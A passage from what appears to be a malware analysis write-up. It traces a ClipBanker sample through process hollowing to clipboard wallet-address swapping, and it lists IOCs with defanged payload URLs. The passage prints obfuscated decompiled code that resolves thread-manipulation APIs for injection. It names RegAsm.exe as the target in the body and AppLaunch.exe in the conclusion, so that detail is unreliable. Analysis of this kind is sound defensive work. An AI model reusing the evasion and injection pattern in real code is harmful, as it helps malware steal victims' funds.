private static readonly Class1.Delegate2 delegate2_0 = Class1.smethod_0<Class1.Delegate2>("kern!".Replace("!", "el32"), "+adContext".Replace("+", "SetThre"));
private static readonly Class1.Delegate1 delegate1_0 = Class1.smethod_0<Class1.Delegate1>("kern!".Replace("!", "el32"), "Wow64Set%".Replace("%", "ThreadContext"));
private static readonly Class1.Delegate0 delegate0_0 = Class1.smethod_0<Class1.Delegate0>("kern!".Replace("!", "el32"), "@Thread".Replace("@", "Resume"));
```

Following this, we can see that `LAbWJK` - our 2nd executable - is being injected into `RegAsm.exe`.

![DNSpy showing process hollowing of RegAsm.exe with LAbWJK payload](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/11a435b8-b82e-4d19-b4a0-7f91dcea8088)

The 2nd executable is our main payload, which is ClipBanker Malware.

Below we can see the main functionality, which is to monitor the victims clipboard, and when conditions are met, replace it with one of the attacker's wallet addresses.

![DNSpy showing clipboard monitoring and wallet address replacement logic in ClipBanker](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/b18fdb28-f3e3-4cee-9101-aeab63a9e315)

Here are the references to the attacker's wallet addresses:

![DNSpy showing hardcoded attacker cryptocurrency wallet addresses in ClipBanker](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/3313d627-d9db-4b98-b3b2-0be9cfac69bf)

It doesn't look like it's been too successful so far!

![blockchain explorer showing no transactions to attacker wallet addresses](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/8892fc96-43d7-4453-b914-7bd92abc9536)

## IOCs

| Type | Value |
|---|---|
| `SHA256` | `e7e22e5e0f47fe2c2aa71f293e609c4fac901823dce6c6ae39400d1c2f02df54` |
| `SHA256` | `8c21274f725299022fbf415925210da65702198913c4713dfe5dda09ceb2d38a` |
| `URL` | `hxxps[://]uploaddeimagens.com[.]br/images/004/691/257/original/js.jpg?1702591609` |
| `URL` | `hxxps[://]paste[.]ee/d/U57Ki/0` |

## Conclusion

This sample follows a multi-stage execution chain beginning with an obfuscated JavaScript loader. The initial script reverses a URL string to retrieve a second-stage JavaScript payload, which in turn uses a steganographic technique to embed a Base64-encoded payload inside an image file hosted on a legitimate image sharing site. The chain culminates in a process-hollowing loader that injects the final ClipBanker payload into `AppLaunch.exe`. The final payload monitors the victim's clipboard for cryptocurrency wallet address patterns and silently replaces them with addresses under the attacker's control, targeting multiple cryptocurrency types.




